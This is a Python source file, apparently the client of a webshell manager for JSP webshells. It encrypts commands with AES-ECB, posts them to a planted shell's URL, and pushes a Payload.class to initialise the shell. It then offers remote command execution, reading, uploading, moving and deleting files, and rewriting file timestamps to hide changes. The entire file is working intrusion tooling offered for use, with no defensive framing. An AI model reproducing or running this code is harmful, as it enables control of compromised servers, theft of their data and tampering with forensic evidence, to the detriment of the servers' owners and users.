import base64
import hashlib

import requests
from Conf import Conf
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from CommonConf import CommonConf

class JSPCommon:
    def __init__(self,header=''):
        self.headers = Conf.HEADERS
        # print(header)
        if header != '':
            key, value = header.split(":", 1)
            self.headers[key] = value.lstrip()
        self.timeout = Conf.TIMEOUT
        self.payload_path = Conf.JSP_PAYLOAD_FILEPATH
    
    def encrypt_ecb(self,plaintextbyte:bytes,key) -> str:
        key = hashlib.md5(key.encode()).hexdigest()[:16].encode()
        # 创建 AES 加密器s
        cipher = AES.new(key, AES.MODE_ECB)

        # 填充明文，使其长度为块大小的倍数
        padded_text = pad(plaintextbyte, AES.block_size)
        
        # 加密
        ciphertext = cipher.encrypt(padded_text)
        
        # 返回 Base64 编码的密文
        return base64.b64encode(ciphertext).decode()

    def decrypt_ecb(self,ciphertext:str,key) -> bytes:
        key = hashlib.md5(key.encode()).hexdigest()[:16].encode()
        # 创建 AES 解密器
        cipher = AES.new(key, AES.MODE_ECB)
        
        # 先解码密文
        decoded_data = base64.b64decode(ciphertext)
        
        # 解密
        decrypted_padded = cipher.decrypt(decoded_data)
        
        # 取消填充并返回明文
        return unpad(decrypted_padded, AES.block_size)
    
    def read_init_payload(self,filename):
        with open(filename,"r") as fr:
            payload = fr.read()
        return payload
    
    def set_payload(self,payload,key) -> str:
        # payload = ''
        payload = self.encrypt_ecb(payload,key)
        return payload
    
    def send_payload_and_get_result(self,url,password,payload,key):
        data = {password:payload}
        r=requests.post(url=url,headers=self.headers,data=data,verify=False,timeout=self.timeout)
        # print(r.text)
        result = self.decrypt_ecb(r.text,key).decode()
        if result == 'class not init':
            print("Payload class has not been init, waitting...")
            with open(self.payload_path+'Payload.class','rb') as f:
                cipherbyte = f.read()
            initClassData = {
                'initclass': self.encrypt_ecb(cipherbyte,key)
            }
            # send class bytes to init
            requests.post(url=url,headers=self.headers,data=initClassData,verify=False,timeout=self.timeout)

            # continue execute action after class init
            r=requests.post(url=url,headers=self.headers,data=data,verify=False,timeout=self.timeout)
            # print(r3.text)
            result = self.decrypt_ecb(r.text,key).decode()
        
        return result


    def getbasicinfo(self,url,password,key):
        doaction = 'getBasicsInfo'
        # set anything to avoid encript fail
        args = '1'
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data

    def get_files_attr(self,url,password,key,dirName):
        doaction = 'getFile'
        args = dirName
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        data = CommonConf().format_result_jsp_getFileAtt(data)
        return data

    def cat_file(self,url,password,key,filePath):
        doaction = 'readFile'
        args = filePath
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data

    def copy_file(self,url,password,key,srcFileName,destFileName):
        doaction = 'copyFile'
        # split with ','
        args = srcFileName+','+destFileName
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data

    def move_file(self,url,password,key,srcFileName,destFileName):
        doaction = 'moveFile'
        # split with ','
        args = srcFileName+','+destFileName
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data

    def delete_file(self,url,password,key,filePath):
        doaction = 'deleteFile'
        args = filePath
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data

    def upload_file(self,url,password,key,localFile,remoteFile):
        doaction = 'uploadFile'
        # split with ','
        content = ''
        with open(localFile,'r') as f:
            content = f.read()
        args = remoteFile+','+content
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data

    def execCommand(self,url,password,key,cmdLine):
        doaction = 'execCommand'
        command = cmdLine[0]
        commandargs = ''
        if len(cmdLine) > 1:
            commandargs = ' '.join(cmdLine[1:])

        # split with ','
        args = command + ',' +commandargs

        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data
    
    def set_file_time(self,url,password,key,filename,newtime):
        doaction = 'setFileAtt'
        # split with ','
        args = filename + ',' + newtime
        # split with ','
        payload = doaction + ',' +base64.b64encode(args.encode()).decode()
        payload = self.set_payload(payload.encode(),key)
        data = self.send_payload_and_get_result(url,password,payload,key)
        return data